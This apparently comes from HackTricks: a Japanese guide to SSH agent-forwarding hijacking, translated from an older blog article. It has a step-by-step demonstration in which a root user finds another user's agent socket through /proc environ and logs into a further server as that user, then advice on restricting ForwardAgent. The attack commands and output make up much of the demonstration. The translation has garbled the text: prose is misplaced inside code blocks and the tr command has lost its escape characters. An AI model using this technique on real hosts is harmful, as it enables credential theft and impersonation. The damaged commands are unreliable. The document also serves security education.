<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>


# Summary

`/etc/ssh_config`や`$HOME/.ssh/config`の設定ファイル内でこれを発見した場合、何ができるか。
```
ForwardAgent yes
```
マシン内でroot権限を持っている場合、_/tmp_ ディレクトリ内で見つけることができる**任意のエージェントによって行われたssh接続にアクセスできる可能性があります**

Bobのssh-agentの1つを使用してBobになりすます：
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## なぜこれが機能するのか？

`SSH_AUTH_SOCK` 変数を設定すると、BobのSSH接続で使用された鍵にアクセスします。その後、彼の秘密鍵がまだそこにある場合（通常はそうでしょう）、それを使用して任意のホストにアクセスできます。

秘密鍵はエージェントのメモリに暗号化されずに保存されているため、もしBobであっても秘密鍵のパスワードを知らない場合でも、エージェントにアクセスして使用することができると思われます。

もう一つの選択肢は、エージェントの所有者とrootがエージェントのメモリにアクセスして秘密鍵を抽出できる可能性があることです。

# 詳細な説明と悪用

**出典:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **ForwardAgentが信頼できない場合**

パスワードなしのSSHはUnix系オペレーティングシステムでの作業を大いに簡単にします。ネットワークがチェーンされたSSHセッションを要求する場合（例えば、制限されたネットワークにアクセスするために）、エージェント転送は非常に役立ちます。エージェント転送を使用すると、私のラップトップから開発サーバーに接続し、そこから別のサーバーにsvnチェックアウトを実行することができ、すべてパスワードなしで、私の秘密鍵をローカルワークステーションに安全に保持したままです。

しかし、これは危険なこともあります。ウェブ検索をすると、中間ホストが信頼できる場合にのみ安全であると示すいくつかの記事が見つかります。しかし、なぜ危険なのかを説明しているものはめったにありません。

それがこの記事の目的です。しかし、まずいくつかの背景を説明します。

## **パスワードなし認証がどのように機能するか**

通常モードで認証する際、SSHはあなたが主張する人物であることを証明するためにパスワードを使用します。サーバーはこのパスワードのハッシュをファイルに保存しているハッシュと比較し、ハッシュが一致することを確認し、あなたを中に入れます。

攻撃者がサーバーに送信される間にパスワードを保護するために使用される暗号化を破ることができれば、それを盗んでいつでもあなたとしてログインすることができます。攻撃者が何十万回もの試行を許される場合、最終的にはあなたのパスワードを推測することができます。

はるかに安全な認証方法は[公開鍵認証](http://www.ibm.com/developerworks/library/l-keyc/index.html)であり、これはパスワードなしでログインする方法です。公開鍵認証には、公開鍵と秘密鍵の一致するペアが必要です。公開鍵は、秘密鍵でのみ復号化できるメッセージを暗号化します。リモートコンピューターは、あなたに秘密のメッセージを暗号化するためにあなたの公開鍵のコピーを使用します。あなたは、あなたの秘密鍵を使用してメッセージを復号化し、リモートコンピューターにメッセージを返送することで、あなたがあなたであることを証明します。あなたの秘密鍵はずっとあなたのローカルコンピューターに安全に保持されています。

秘密鍵は貴重であり、保護されなければなりません。そのため、デフォルトでは暗号化された形式で保存されます。残念ながら、これは使用する前に暗号化パスフレーズを入力することを意味します。多くの記事では、この不便を避けるためにパスフレーズなし（暗号化されていない）の秘密鍵を使用することを提案しています。それは悪い考えです。なぜなら、あなたのワークステーションにアクセスできる人（物理的アクセス、盗難、またはハッキングによって）は、あなたの公開鍵で設定された任意のコンピューターに自由にアクセスできるようになるからです。

OpenSSHには[ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)が含まれており、これはあなたのローカルワークステーションで実行されるデーモンです。これは、あなたの秘密鍵の復号化されたコピーをメモリにロードし、パスフレーズを一度だけ入力する必要があります。その後、SSHクライアントがリモートサーバーによって送り返された暗号化されたメッセージを復号化するように要求するために使用できるローカル[ソケット](http://en.wikipedia.org/wiki/Unix\_domain\_socket)を提供します。あなたの秘密鍵はssh-agentプロセスのメモリに安全に保持されたままでありながら、パスワードを入力せずにSSHを使用することができます。

## **ForwardAgentがどのように機能するか**

多くのタスクでは「チェーン」SSHセッションが必要です。先ほどの私の例を考えてみてください：私はワークステーションから開発サーバーにSSHで接続します。そこにいる間、「svn+ssh」プロトコルを使用してsvnアップデートを実行する必要があります。共有サーバーに超秘密の秘密鍵の暗号化されていないコピーを残すのは馬鹿げているので、私は今パスワード認証で立ち往生しています。しかし、私のワークステーションのSSH設定で「ForwardAgent」を有効にした場合、SSHはその組み込みのトンネリング機能を使用して、開発サーバー上に別のソケットを作成し、それを私のローカルワークステーション上のssh-agentソケットにトンネルバックします。これは、開発サーバー上のSSHクライアントが今、「この秘密のメッセージを復号化してください」という要求を直接私のワークステーション上で実行しているssh-agentに送ることができることを意味し、私の秘密鍵にアクセスすることなくsvnサーバーに対して自分自身を認証できます。

## **これが危険である理由**

簡単に言うと、中間サーバー上のroot権限を持つ人は誰でも、他のサーバーに対してあなたのssh-agentを使用して認証することができます。これがいかに簡単に行われるかを示す簡単なデモンストレーションがあります。ホスト名とユーザー名は無実の人々を保護するために変更されています。

私のラップトップはssh-agentを実行しており、これはソケットを介してsshクライアントプログラムと通信します。このソケットへのパスはSSH\_AUTH\_SOCK環境変数に保存されています：
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
[ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) プログラムにより、エージェント内のキーを表示および操作できます：
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
```
私のラップトップの\~/.ssh/configには「ForwardAgent yes」とあります。したがって、sshはローカルソケットをリモートサーバー上のローカルソケットに接続するトンネルを作成します：
```
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
```
たとえ私のキーが「seattle」にインストールされていなくても、sshクライアントプログラムはまだ私のローカルマシンで実行されているエージェントにアクセスできます：
```
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
So… who can we mess with?
```
では、誰をターゲットにできるでしょうか？
```
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
私はボブが好きではありませんでした。彼のエージェント接続を見つけるためには、彼のsshセッションの子プロセスを見つける必要があります：
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)───bash(16817)

sshd(25296)───bash(25297)───vim(14308)
```
```markdown
rootが実行中のプロセスの環境を表示する方法はいくつかあります。Linuxでは、データは/proc/\<pid>/environにあります。NULLで終わる文字列で保存されているため、NULLを改行に変換するためにtrを使用します：
```
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
私は今、Bobのssh-agentをハイジャックするために必要なすべてを知っています：
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
```markdown
特定のターゲットが頭にある場合、今は直接接続できるはずです。そうでなければ、プロセスリストを見たり、Bobの履歴ファイルをgrepしたりするだけで、十分なターゲットが見つかるはずです。このケースでは、Bobが「boston」という名前のサーバーに様々な超秘密のファイルを保存していることを知っています：
```
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **自分を守る！**

ssh-agentがキーを無期限に保管しないようにしましょう。OS Xでは、Keychainを設定して、非アクティブ状態や画面がロックされた後にロックするようにします。他のUnix系プラットフォームでは、ssh-agentに-tオプションを渡して、キーが秒後に削除されるようにします。

信頼できないホストに接続するときは、エージェントフォワーディングを有効にしないでください。幸いなことに、\~/.ssh/configの構文はこれをかなり簡単にします：
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **おすすめの読書**

* [OpenSSHキー管理](http://www.ibm.com/developerworks/library/l-keyc/index.html) – Daniel Robbins
* [SSHエージェントフォワーディングのイラストガイド](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) – Steve Friedl
* [ssh-agentマニュアル](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [ssh-addマニュアル](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
